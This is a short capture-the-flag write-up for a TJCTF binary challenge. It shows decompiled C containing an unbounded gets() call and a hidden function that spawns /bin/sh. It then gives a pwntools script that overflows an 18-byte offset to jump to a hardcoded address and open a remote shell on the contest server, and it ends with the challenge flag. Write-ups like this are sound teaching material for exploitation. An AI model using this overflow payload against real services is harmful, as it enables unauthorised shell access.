Attached is a binary.

## Description

First we use `checksec` to see which security features are enabled. There is no PIE, nor canary, so exploit will probably be easy. Let's decompile the code using Ghidra.

```c
undefined8 main(void)
{
  int iVar1;
  char local_12 [10];
  
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts("Welcome to Sally\'s Seashore Shell Shop");
  puts("Would you like a shell?");
  gets(local_12);
  iVar1 = strcasecmp(local_12,"yes");
  if (iVar1 == 0) {
    puts("sorry, we are out of stock");
  }
  else {
    puts("why are you even here?");
  }
  return 0;
}
```

So here is our buffer overflow: it only uses the `gets` function which performs no boundary check.

Moreover, we see a function `shell`:

```c

void shell(long param_1)

{
  if (param_1 == -0x2152350145414111) {
    system("/bin/sh");
  }
  return;
}
```

Easily enough, we have the call to system. No PIE means we can know the address of `shell` on the server, so the exploit is quite straightforward.

## Solution

With `gdb` we retrieve the address of the instructions corresponding to `system("/bin/sh");` (we bypass the if statement), overflow the buffer and jump there.

To find the offset, we also use gdb, filling the buffer with a cyclic pattern and verify where we jump.

```python
from pwn import *

sh = remote("p1.tjctf.org", 8009)

shell_addr = 0x00000000004006e3
offset = 18

sh.recvuntil("hell?")
payload = b'a'*offset + p64(shell_addr) + b'\x00'
sh.sendline(payload)

sh.interactive()
```

Flag: `tjctf{she_s3lls_se4_sh3ll5}`
